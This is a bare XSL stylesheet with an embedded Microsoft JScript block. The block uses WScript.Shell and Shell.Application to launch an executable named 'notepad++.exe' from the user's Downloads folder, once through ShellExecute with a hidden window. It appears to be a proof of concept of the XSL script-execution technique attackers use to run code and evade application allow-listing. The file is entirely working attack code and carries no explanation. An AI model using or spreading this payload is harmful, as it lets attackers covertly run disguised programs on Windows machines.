<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var oShell = new ActiveXObject("Shell.Application");
	oShell = new ActiveXObject("WScript.Shell");
	var homeDir = oShell.ExpandEnvironmentStrings("%USERPROFILE%");
	var commandtoRun = homeDir + "\\Downloads\\myProjects\\notepad++.exe";
	oShell.Run(commandtoRun);
	oShell.ShellExecute(commandtoRun,"","","open","0");
	]]> </ms:script>
</stylesheet>
